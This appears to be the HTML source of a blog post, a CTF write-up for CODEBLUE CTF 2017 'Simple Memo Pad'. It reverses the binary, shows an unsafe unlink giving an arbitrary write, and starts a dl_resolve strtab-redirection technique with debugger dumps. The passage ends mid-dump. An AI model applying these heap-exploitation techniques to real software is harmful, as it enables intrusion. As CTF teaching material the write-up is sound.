@@ -1,0 +1,759 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>CODEBLUE CTF 2017 - Simple Memo Pad | kileak</title>
+
+
+
+
+
+<meta name="description" content="CODEBLUE CTF 2017 - Simple Memo Pad">
+
+
+<meta name="keywords" content="codeblue">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2017/CODEBLUE-SimpleMemoPad/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">CODEBLUE CTF 2017 - Simple Memo Pad</h1>
+      <p class="post-meta">Nov 9, 2017</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>Simple Memo Pad (8 solves) (399 points)
+<!--break--></p>
+
+  <p>nc memopad.tasks.ctf.codeblue.jp 5498</p>
+
+  <p>Attachment: <a href="https://kileak.github.io/assets/simplememopad/simple_memo_pad.tgz">simple_memo_pad.tgz</a> <a href="https://kileak.github.io/assets/simplememopad/xpl.py">xpl.py</a></p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">*******************************
+*       Simple Memo Pad       *
+*******************************
+                     Ver. Alpha
+
+
+1. Write a note on a blank area
+2. Edit a note
+3. Delete a note
+4. Show a note
+5. Quit
+&gt; </code></pre></figure>
+
+<p>Hmm, <code class="language-plaintext highlighter-rouge">Write</code>, <code class="language-plaintext highlighter-rouge">Edit</code>, <code class="language-plaintext highlighter-rouge">Delete</code>, <code class="language-plaintext highlighter-rouge">Show</code>… Looks like the default entry heap challenge…</p>
+
+<p>But then, we’re only allowed to edit and delete once, and well, <code class="language-plaintext highlighter-rouge">Show a note</code> only returns a sad:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">Sorry, not implemented yet.</code></pre></figure>
+
+<p>So, things look grim. After reversing the binary even more :)</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">initApp</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="p">...</span>
+
+  <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/urandom"</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  
+  <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">2uLL</span><span class="p">);</span>
+  <span class="n">malloc</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>          <span class="c1">// Create random sized buffer on heap -.-</span>
+  
+  <span class="p">...</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>The first thing it does, is to create a buffer on the heap with a random size, so our chunks will be on an unpredictable offset in the heap.</p>
+
+<p>After this, it will create 20 chunks on the heap</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">Note</span> <span class="p">{</span>
+  <span class="kt">long</span> <span class="n">Canary</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">Index</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">InUse</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">Content</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
+  <span class="kt">long</span> <span class="n">Next</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="n">Prev</span><span class="p">;</span>
+<span class="p">};</span>
+
+<span class="n">Note</span> <span class="o">*</span><span class="nf">initializeChunks</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">Note</span> <span class="o">*</span><span class="n">headNote</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+  <span class="n">Note</span> <span class="o">*</span><span class="n">prevNote</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+  <span class="n">Note</span> <span class="o">*</span><span class="n">currentNote</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+
+  <span class="k">for</span> <span class="p">(</span> <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">19</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">currentNote</span> <span class="o">=</span> <span class="p">(</span><span class="n">Note</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mi">160uLL</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">currentNote</span> <span class="p">)</span>
+      <span class="n">showSomethingWrong</span><span class="p">();</span>
+
+    <span class="n">currentNote</span><span class="o">-&gt;</span><span class="n">Canary</span> <span class="o">=</span> <span class="n">get_note_canary</span><span class="p">();</span>
+    <span class="n">currentNote</span><span class="o">-&gt;</span><span class="n">Index</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="n">currentNote</span><span class="o">-&gt;</span><span class="n">InUse</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">currentNote</span><span class="o">-&gt;</span><span class="n">Content</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">128uLL</span><span class="p">);</span>
+    <span class="n">currentNote</span><span class="o">-&gt;</span><span class="n">Next</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+    <span class="n">currentNote</span><span class="o">-&gt;</span><span class="n">Prev</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span> <span class="n">headNote</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">prevNote</span><span class="o">-&gt;</span><span class="n">Next</span> <span class="o">=</span> <span class="n">currentNote</span><span class="p">;</span>
+      <span class="n">currentNote</span><span class="o">-&gt;</span><span class="n">Prev</span> <span class="o">=</span> <span class="n">prevNote</span><span class="p">;</span>
+
+      <span class="n">prevNote</span> <span class="o">=</span> <span class="n">currentNote</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+      <span class="n">strcpy</span><span class="p">(</span><span class="n">currentNote</span><span class="o">-&gt;</span><span class="n">Content</span><span class="p">,</span> <span class="s">"This is a sample!"</span><span class="p">);</span>
+
+      <span class="n">currentNote</span><span class="o">-&gt;</span><span class="n">InUse</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+      <span class="n">prevNote</span> <span class="o">=</span> <span class="n">currentNote</span><span class="p">;</span>
+      <span class="n">headNote</span> <span class="o">=</span> <span class="n">currentNote</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">headNote</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Since it’s setting some kind of FD/BK pointer, it looks like some custom (and probably vulnerable) malloc implementation is coming up.</p>
+
+<p>But to harden things up, a canary is placed in the beginning of every chunk…</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">writeNote</span><span class="p">(</span><span class="n">Note</span> <span class="o">*</span><span class="n">headNote</span><span class="p">)</span>
+<span class="p">{</span>  
+  <span class="n">Note</span> <span class="o">*</span><span class="n">freeNote</span><span class="p">;</span>
+
+  <span class="c1">// Search next note chunk, that is not currently in use</span>
+  <span class="k">for</span> <span class="p">(</span> <span class="n">freeNote</span> <span class="o">=</span> <span class="n">headNote</span><span class="p">;</span> <span class="n">freeNote</span> <span class="o">&amp;&amp;</span> <span class="n">freeNote</span><span class="o">-&gt;</span><span class="n">InUse</span><span class="p">;</span> <span class="n">freeNote</span> <span class="o">=</span> <span class="n">freeNote</span><span class="o">-&gt;</span><span class="n">Next</span> <span class="p">);</span>
+
+  <span class="k">if</span> <span class="p">(</span> <span class="n">freeNote</span> <span class="p">)</span>
+  <span class="p">{</span>    
+    <span class="c1">// Check the note canary</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">freeNote</span><span class="o">-&gt;</span><span class="n">Canary</span> <span class="o">!=</span> <span class="n">get_note_canary</span><span class="p">()</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">writeText</span><span class="p">(</span><span class="s">"Linked list corruption detected :P</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+      <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">writeText</span><span class="p">(</span><span class="s">"Content: "</span><span class="p">);</span>
+    <span class="n">callRead</span><span class="p">(</span><span class="n">freeNote</span><span class="o">-&gt;</span><span class="n">Content</span><span class="p">,</span> <span class="mi">128LL</span><span class="p">,</span> <span class="sc">'\n'</span><span class="p">);</span>
+    <span class="n">freeNote</span><span class="o">-&gt;</span><span class="n">InUse</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="n">writeText</span><span class="p">(</span><span class="s">"Done!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">else</span>
+  <span class="p">{</span>
+    <span class="n">writeText</span><span class="p">(</span><span class="s">"Out of paper.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>This one breaks it. Even if we would be able to corrupt the linked note list, the next write would check, if the canary of the note is correct and terminate, if we’d try to overwrite some <code class="language-plaintext highlighter-rouge">got</code> entry for example (since no canary is near).</p>
+
+<p>But let’s continue with the reversing for now</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">editNote</span><span class="p">(</span><span class="n">Note</span> <span class="o">*</span><span class="n">headNote</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">index</span><span class="p">;</span> 
+  <span class="n">Note</span> <span class="o">*</span><span class="n">selectedNote</span><span class="p">;</span> 
+
+  <span class="n">writeText</span><span class="p">(</span><span class="s">"Index: "</span><span class="p">);</span>
+  <span class="n">index</span> <span class="o">=</span> <span class="n">read_number</span><span class="p">();</span>
+
+  <span class="k">if</span> <span class="p">(</span> <span class="n">index</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">writeText</span><span class="p">(</span><span class="s">"You can't edit sample page.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">else</span>
+  <span class="p">{</span>
+    <span class="k">for</span> <span class="p">(</span> <span class="n">selectedNote</span> <span class="o">=</span> <span class="n">headNote</span><span class="p">;</span> <span class="n">selectedNote</span> <span class="o">&amp;&amp;</span> <span class="n">selectedNote</span><span class="o">-&gt;</span><span class="n">Index</span> <span class="o">!=</span> <span class="n">index</span><span class="p">;</span> <span class="n">selectedNote</span> <span class="o">=</span> <span class="n">selectedNote</span><span class="o">-&gt;</span><span class="n">Next</span> <span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span> <span class="n">selectedNote</span> <span class="p">)</span>
+    <span class="p">{</span>      
+      <span class="k">if</span> <span class="p">(</span> <span class="n">selectedNote</span><span class="o">-&gt;</span><span class="n">Canary</span> <span class="o">!=</span> <span class="n">get_note_canary</span><span class="p">()</span> <span class="p">)</span>
+      <span class="p">{</span>
+        <span class="n">writeText</span><span class="p">(</span><span class="s">"Linked list corruption detected :P</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="n">selectedNote</span><span class="o">-&gt;</span><span class="n">InUse</span> <span class="p">)</span>
+      <span class="p">{</span>
+        <span class="n">writeText</span><span class="p">(</span><span class="s">"Content: "</span><span class="p">);</span>
+
+        <span class="n">callRead</span><span class="p">(</span><span class="n">selectedNote</span><span class="o">-&gt;</span><span class="n">Content</span><span class="p">,</span> <span class="mi">136LL</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>     <span class="c1">// Overwrite of FD possible</span>
+                                                
+        <span class="n">writeText</span><span class="p">(</span><span class="s">"Done!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+      <span class="p">}</span>
+      <span class="k">else</span>
+      <span class="p">{</span>
+        <span class="n">writeText</span><span class="p">(</span><span class="s">"You can't edit a blank page.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+      <span class="n">writeText</span><span class="p">(</span><span class="s">"Page not found.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+      <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>  
+<span class="p">}</span></code></pre></figure>
+
+<p>So, editing a note reads 136 bytes, thus allowing us to overwrite the <code class="language-plaintext highlighter-rouge">Next</code> pointer of the note chunk (but only this one, leaving the <code class="language-plaintext highlighter-rouge">Prev</code> pointer intact).</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">deleteNote</span><span class="p">(</span><span class="n">Note</span> <span class="o">*</span><span class="n">headNote</span><span class="p">)</span>
+<span class="p">{</span> 
+  <span class="kt">int</span> <span class="n">index</span><span class="p">;</span> 
+
+  <span class="n">Note</span> <span class="o">*</span><span class="n">selectedNote</span><span class="p">;</span> 
+
+  <span class="n">writeText</span><span class="p">(</span><span class="s">"Index: "</span><span class="p">);</span>
+  <span class="n">index</span> <span class="o">=</span> <span class="n">read_number</span><span class="p">();</span>
+
+  <span class="p">...</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="n">selectedNote</span><span class="o">-&gt;</span><span class="n">InUse</span> <span class="p">)</span>
+      <span class="p">{</span>
+        <span class="n">Note</span><span class="o">*</span> <span class="n">ptr_prev_note</span> <span class="o">=</span> <span class="n">selectedNote</span><span class="o">-&gt;</span><span class="n">Prev</span><span class="p">;</span>
+        <span class="n">Note</span><span class="o">*</span> <span class="n">ptr_next_note</span> <span class="o">=</span> <span class="n">selectedNote</span><span class="o">-&gt;</span><span class="n">Next</span><span class="p">;</span>     
+
+        <span class="c1">// Unsafe unlink</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="n">ptr_prev_note</span> <span class="p">)</span>
+          <span class="n">ptr_prev_note</span><span class="o">-&gt;</span><span class="n">Next</span> <span class="o">=</span> <span class="n">ptr_next_note</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="n">ptr_next_note</span> <span class="p">)</span>
+          <span class="n">ptr_next_note</span><span class="o">-&gt;</span><span class="n">Prev</span> <span class="o">=</span> <span class="n">ptr_prev_note</span><span class="p">;</span>
+
+        <span class="n">writeText</span><span class="p">(</span><span class="s">"Done!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+      <span class="p">}</span>
+  <span class="p">...</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Ok, so we’ve got an <code class="language-plaintext highlighter-rouge">unsafe unlink</code> here.</p>
+
+<p>Thus, since we control <code class="language-plaintext highlighter-rouge">Next</code> we can write the address from the <code class="language-plaintext highlighter-rouge">Prev</code> pointer anywhere (by <code class="language-plaintext highlighter-rouge">ptr_next_note-&gt;Prev = ptr_prev_note</code>). <code class="language-plaintext highlighter-rouge">Prev</code> is at offset 0x98 from the chunk, so to overwrite an address <code class="language-plaintext highlighter-rouge">x</code> we just have to set <code class="language-plaintext highlighter-rouge">Next</code> to <code class="language-plaintext highlighter-rouge">x - 0x98</code>, and then the unlink will write value from <code class="language-plaintext highlighter-rouge">Prev</code> to <code class="language-plaintext highlighter-rouge">x</code>.</p>
+
+<p>Let’s sum this up:</p>
+
+<ul>
+  <li>No leak available in the binary</li>
+  <li>Chunks are at random offsets in the heap</li>
+  <li>Every chunk has a canary, so we cannot use <code class="language-plaintext highlighter-rouge">writeNote</code> to write anywhere except in our preinitialized chunks</li>
+  <li>We can overwrite ONE arbitrary address with the address of one of our note chunks</li>
+</ul>
+
+<p>This left me stumped for a while, thinking what we could possibly do with one write without knowing any address (except the bss ones).</p>
+
+<p>Well. No leaks and no libc given? This actually yells for <code class="language-plaintext highlighter-rouge">dlresolve</code>…</p>
+
+<p>When the binary tries to call a libc function for the first time, it has to use <code class="language-plaintext highlighter-rouge">dl_resolve</code> to get the actual address for this function from libc at runtime. This will call <code class="language-plaintext highlighter-rouge">_dl_fixup</code>, and pass the link_map, with which it can resolve the addresses from libc. It can be rather tedious to forge a fake linkmap to trick <code class="language-plaintext highlighter-rouge">dl_resolve</code>, but luckily we won’t have to do that this time :)</p>
+
+<p>Let’s look at a very stripped down version of <code class="language-plaintext highlighter-rouge">_dl_fixup</code></p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">_dl_fixup</span> <span class="p">(</span><span class="k">struct</span> <span class="n">link_map</span> <span class="o">*</span><span class="n">l</span><span class="p">,</span> <span class="n">ElfW</span><span class="p">(</span><span class="n">Word</span><span class="p">)</span> <span class="n">reloc_arg</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">const</span> <span class="n">ElfW</span><span class="p">(</span><span class="n">Sym</span><span class="p">)</span> <span class="o">*</span><span class="k">const</span> <span class="n">symtab</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">D_PTR</span> <span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">l_info</span><span class="p">[</span><span class="n">DT_SYMTAB</span><span class="p">]);</span>
+  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">strtab</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">D_PTR</span> <span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">l_info</span><span class="p">[</span><span class="n">DT_STRTAB</span><span class="p">]);</span>
+
+  <span class="k">const</span> <span class="n">PLTREL</span> <span class="o">*</span><span class="k">const</span> <span class="n">reloc</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">D_PTR</span> <span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">l_info</span><span class="p">[</span><span class="n">DT_JMPREL</span><span class="p">])</span> <span class="o">+</span> <span class="n">reloc_offset</span><span class="p">);</span>
+  <span class="k">const</span> <span class="n">ElfW</span><span class="p">(</span><span class="n">Sym</span><span class="p">)</span> <span class="o">*</span><span class="n">sym</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">symtab</span><span class="p">[</span><span class="n">ELFW</span><span class="p">(</span><span class="n">R_SYM</span><span class="p">)</span> <span class="p">(</span><span class="n">reloc</span><span class="o">-&gt;</span><span class="n">r_info</span><span class="p">)];</span>
+
+  <span class="p">...</span>
+
+  <span class="cm">/* Sanity check that we're really looking at a PLT relocation.  */</span>
+  <span class="n">assert</span> <span class="p">(</span><span class="n">ELFW</span><span class="p">(</span><span class="n">R_TYPE</span><span class="p">)(</span><span class="n">reloc</span><span class="o">-&gt;</span><span class="n">r_info</span><span class="p">)</span> <span class="o">==</span> <span class="n">ELF_MACHINE_JMP_SLOT</span><span class="p">);</span>
+
+   <span class="cm">/* Look up the target symbol.  If the normal lookup rules are not used don't look in the global scope.  */</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">ELFW</span><span class="p">(</span><span class="n">ST_VISIBILITY</span><span class="p">)</span> <span class="p">(</span><span class="n">sym</span><span class="o">-&gt;</span><span class="n">st_other</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="p">{</span>      
+      <span class="k">if</span> <span class="p">(</span><span class="n">l</span><span class="o">-&gt;</span><span class="n">l_info</span><span class="p">[</span><span class="n">VERSYMIDX</span> <span class="p">(</span><span class="n">DT_VERSYM</span><span class="p">)]</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
+      <span class="p">{</span>
+        <span class="p">...</span>
+      <span class="p">}</span>
+     
+      <span class="n">result</span> <span class="o">=</span> <span class="n">_dl_lookup_symbol_x</span> <span class="p">(</span><span class="n">strtab</span> <span class="o">+</span> <span class="n">sym</span><span class="o">-&gt;</span><span class="n">st_name</span><span class="p">,</span> <span class="n">l</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sym</span><span class="p">,</span> <span class="n">l</span><span class="o">-&gt;</span><span class="n">l_scope</span><span class="p">,</span> <span class="n">version</span><span class="p">,</span> <span class="n">ELF_RTYPE_CLASS_PLT</span><span class="p">,</span> <span class="n">flags</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+
+      <span class="p">...</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+      <span class="c1">// Symbol is already resolved      </span>
+    <span class="p">}</span>
+
+  <span class="p">...</span>
+  <span class="k">return</span> <span class="n">elf_machine_fixup_plt</span> <span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">result</span><span class="p">,</span> <span class="n">reloc</span><span class="p">,</span> <span class="n">rel_addr</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<p><code class="language-plaintext highlighter-rouge">strtab</code> is just a table of symbol names (strings), that are used in the binary.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text"> x/20s 0x400418
+0x400418: ""
+0x400419: "libc.so.6"
+0x400423: "__stack_chk_fail"
+0x400434: "_exit"
+0x40043a: "strlen"
+0x400441: "memset"
+0x400448: "__errno_location"
+0x400459: "read"
+0x40045e: "malloc"
+0x400465: "atoi"
+0x40046a: "close"
+0x400470: "open"
+0x400475: "sleep"
+0x40047b: "strcmp"
+0x400482: "__libc_start_main"
+0x400494: "write"
+0x40049a: "__gmon_start__"
+0x4004a9: "GLIBC_2.4"
+0x4004b3: "GLIBC_2.2.5"
+0x4004bf: ""</code></pre></figure>
+
+<p>With the symbol table, <code class="language-plaintext highlighter-rouge">_dl_fixup</code> will calculate the offset of the symbol name to lookup (<code class="language-plaintext highlighter-rouge">strtab + sym-&gt;st_name</code>), and then call <code class="language-plaintext highlighter-rouge">_dl_lookup_symbol_x</code>, which will resolve the function from libc by it’s symbol name.</p>
+
+<p>The link_map has a pointer to the <code class="language-plaintext highlighter-rouge">strtab</code>, which gets loaded in <code class="language-plaintext highlighter-rouge">_dl_fixup</code></p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">x/100gx 0x00007f82e69d4170
+0x7f82e69d4170: 0x0000000000000000  0x00007f82e69d4700
+0x7f82e69d4180: 0x00000000006017d0  0x00007f82e69d4708
+0x7f82e69d4190: 0x0000000000000000  0x00007f82e69d4170
+0x7f82e69d41a0: 0x0000000000000000  0x00007f82e69d46e8
+0x7f82e69d41b0: 0x0000000000000000  0x00000000006017d0
+0x7f82e69d41c0: 0x00000000006018b0  0x00000000006018a0
+0x7f82e69d41d0: 0x0000000000000000  0x0000000000601850   &lt;== Pointer to strtab - 0x8
+0x7f82e69d41e0: 0x0000000000601860  0x00000000006018e0
+0x7f82e69d41f0: 0x00000000006018f0  0x0000000000601900
+0x7f82e69d4200: 0x0000000000601870  0x0000000000601880
+0x7f82e69d4210: 0x00000000006017e0  0x00000000006017f0
+0x7f82e69d4220: 0x0000000000000000  0x0000000000000000</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[----------------------------------registers-----------------------------------]
+RAX: 0x7fffffffdfc0 --&gt; 0x31 ('1')
+RBX: 0x7fffffffdfa0 --&gt; 0x0 
+RCX: 0x0 
+RDX: 0x24 ('$')
+RSI: 0xc ('\x0c')
+RDI: 0x7fb660066170 --&gt; 0x0                                                         # Linkmap
+RBP: 0x7fffffffdfe0 --&gt; 0x7fffffffe030 --&gt; 0x401190 (push   r15)
+RSP: 0x7fffffffde80 --&gt; 0x0 
+RIP: 0x7fb65fe4fbde (&lt;_dl_fixup+14&gt;:  mov    rax,QWORD PTR [rdi+0x68])
+[-------------------------------------code-------------------------------------]
+   0x7fb65fe4fbd4 &lt;_dl_fixup+4&gt;:  mov    esi,esi
+   0x7fb65fe4fbd6 &lt;_dl_fixup+6&gt;:  lea    rdx,[rsi+rsi*2]
+   0x7fb65fe4fbda &lt;_dl_fixup+10&gt;: sub    rsp,0x10
+=&gt; 0x7fb65fe4fbde &lt;_dl_fixup+14&gt;: mov    rax,QWORD PTR [rdi+0x68]
+   0x7fb65fe4fbe2 &lt;_dl_fixup+18&gt;: mov    rdi,QWORD PTR [rax+0x8]
+   0x7fb65fe4fbe6 &lt;_dl_fixup+22&gt;: mov    rax,QWORD PTR [r10+0xf8]
+   0x7fb65fe4fbed &lt;_dl_fixup+29&gt;: mov    rax,QWORD PTR [rax+0x8]
+   0x7fb65fe4fbf1 &lt;_dl_fixup+33&gt;: lea    r8,[rax+rdx*8]
+
+69    const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[----------------------------------registers-----------------------------------]
+RAX: 0x601850 --&gt; 0x5                                                             # pointer to strtab - 0x8
+RBX: 0x7fffffffdfa0 --&gt; 0x0 
+RCX: 0x0 
+RDX: 0x24 ('$')
+RSI: 0xc ('\x0c')
+RDI: 0x7fb660066170 --&gt; 0x0 
+RBP: 0x7fffffffdfe0 --&gt; 0x7fffffffe030 --&gt; 0x401190 (push   r15)
+RSP: 0x7fffffffde80 --&gt; 0x0 
+RIP: 0x7fb65fe4fbe2 (&lt;_dl_fixup+18&gt;:  mov    rdi,QWORD PTR [rax+0x8])
+[-------------------------------------code-------------------------------------]
+   0x7fb65fe4fbd6 &lt;_dl_fixup+6&gt;:  lea    rdx,[rsi+rsi*2]
+   0x7fb65fe4fbda &lt;_dl_fixup+10&gt;: sub    rsp,0x10
+   0x7fb65fe4fbde &lt;_dl_fixup+14&gt;: mov    rax,QWORD PTR [rdi+0x68]
+=&gt; 0x7fb65fe4fbe2 &lt;_dl_fixup+18&gt;: mov    rdi,QWORD PTR [rax+0x8]
+   0x7fb65fe4fbe6 &lt;_dl_fixup+22&gt;: mov    rax,QWORD PTR [r10+0xf8]
+   0x7fb65fe4fbed &lt;_dl_fixup+29&gt;: mov    rax,QWORD PTR [rax+0x8]
+   0x7fb65fe4fbf1 &lt;_dl_fixup+33&gt;: lea    r8,[rax+rdx*8]
+   0x7fb65fe4fbf5 &lt;_dl_fixup+37&gt;: mov    rax,QWORD PTR [r10+0x70]
+
+
+69    const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[----------------------------------registers-----------------------------------]
+RAX: 0x601850 --&gt; 0x5 
+RBX: 0x7fffffffdfa0 --&gt; 0x0 
+RCX: 0x0 
+RDX: 0x24 ('$')
+RSI: 0xc ('\x0c')
+RDI: 0x400418 --&gt; 0x6f732e6362696c00 ('')                                       # strtab
+RBP: 0x7fffffffdfe0 --&gt; 0x7fffffffe030 --&gt; 0x401190 (push   r15)
+RSP: 0x7fffffffde80 --&gt; 0x0 
+RIP: 0x7fb65fe4fbe6 (&lt;_dl_fixup+22&gt;:  mov    rax,QWORD PTR [r10+0xf8])
+[-------------------------------------code-------------------------------------]
